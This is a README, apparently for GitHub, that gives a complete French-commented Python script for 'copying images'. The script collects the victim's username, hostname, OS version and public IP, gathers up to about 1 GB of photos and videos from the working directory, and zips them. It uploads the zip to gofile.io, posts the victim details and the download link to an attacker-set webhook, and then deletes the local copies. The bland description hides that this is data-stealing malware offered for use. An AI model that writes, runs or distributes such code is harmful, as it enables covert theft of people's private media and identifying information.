# Usage Instructions for your Python Script

## Webhook Configuration

Replace `YOUR_WBK_URL` with your own webhook URL.

<details>
<summary>Click to view the code</summary>

```python
wh00k = "YOUR_WBK_URL"
```

</details>

## Python Script

<details>
<summary>Click to view the code</summary>

```python
wh00k = "YOUR_WBK_URL"


import os
import platform
import zipfile
import requests
import json
import shutil
import socket

COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m" 
COLOR_MAGENTA = "\033[95m"


def adresse_ip():
    response = requests.get("https://ipinfo.io/json")
    ip_data = json.loads(response.text)
    return ip_data.get('ip', 'N/A')

informations = {
        "Utilisateur": os.getlogin() if os.name == "posix" else None,
        "nom d'hôte": socket.gethostname(),
        "Système d'exploitation": platform.system(),
        "Version du système d'exploitation": platform.release(),
        "Adresse IP": adresse_ip()
}

max_fichiers = 10 
count_per_directory = 0
max_go = 0.99 
dossier_img = "images"
if not os.path.exists(dossier_img):
    os.makedirs(dossier_img) 

def taille_dossier(dossier):
    total_size = 0
    with os.scandir(dossier) as it:
        for entry in it:
            if entry.is_file():
                total_size += entry.stat().st_size
            elif entry.is_dir():
                total_size += taille_dossier(entry.path)
    return total_size / (1024 * 1024 * 1024)

def copier(directory_path):
    global count_per_directory, dossier_img
    taille_images_gb = taille_dossier(dossier_img)
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if taille_images_gb > max_go:
                print(COLOR_MAGENTA + "Images recuperées, Téléchargement.")
                return 
            if count_per_directory >= max_fichiers:

                count_per_directory = 0
                dossier_img = "images"

            if file.lower().endswith(('.jpg', '.jpeg', '.mp4', '.mov')):
                source_path = os.path.join(root, file)
                destination_path = os.path.join(dossier_img, file)

                taille_mo = os.path.getsize(source_path) / (1024 * 1024)
                if taille_mo > 60:
                    print(COLOR_RED + f"[-] Le fichier {file} dépasse la taille limite (60 Mo).")
                    continue 

                if os.path.abspath(source_path) != os.path.abspath(destination_path):
                    try:
                        shutil.copy(source_path, destination_path)
                        count_per_directory += 1
                        taille_images_gb = taille_dossier(dossier_img)
                        prcent = taille_images_gb*100
                        print(COLOR_GREEN + f"Images / videos trouvées: {prcent:.2f} %")
                    except PermissionError as e:
                        print(COLOR_RED + "[*]")
                else:
                    print(COLOR_RED + "[-]")

repertoire_actuel = os.getcwd() 
copier(repertoire_actuel)

with zipfile.ZipFile("images.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(dossier_img):
            for file in files:
                zipf.write(os.path.join(root, file), file)


upload_url = "https://store1.gofile.io/uploadFile"

fichier_zip = "images.zip"

with open(fichier_zip, "rb") as file:
    files = {"file": file}

    response = requests.post(upload_url, files=files)

    if response.status_code == 200:
        data = response.json()

message = {
    "embeds": [
        {
            "title": "Images trouvées sur l'appareil",
            "color": 000000000,
            "fields": [
                {"name": "Utilisateur", "value": informations["Utilisateur"], "inline": True},
                {"name": "Nom d'hôte", "value": informations["nom d'hôte"], "inline": True},
                {"name": "Système d'exploitation", "value": informations["Système d'exploitation"], "inline": True},
                {"name": "Version du système d'exploitation", "value": informations["Version du système d'exploitation"], "inline": True},
                {"name": "Adresse IP", "value": informations["Adresse IP"], "inline": True},
                {"name": "Lien du fichier ZIP", "value": data["data"]["downloadPage"], "inline": False}
            ]
        }
    ]
}
response = requests.post(wh00k, json=message)
print(COLOR_GREEN + "[++] Téléchargement terminé.") 
shutil.rmtree(dossier_img)
os.remove("images.zip") 


```

</details>

## Running the Script

1. Configure the webhook URL as shown above.
2. Run the script in your Python environment.

## Important Notes

- This script copies image and video files from the specified directory to a destination folder.
- It then creates a ZIP file from the copied images and videos.
- Finally, it uploads the ZIP file to the specified file upload service and sends a notification via the webhook.

Feel free to modify the script to suit your needs!
```

You can copy and paste this into your README.md file. When viewed on GitHub, the code sections will be collapsible.
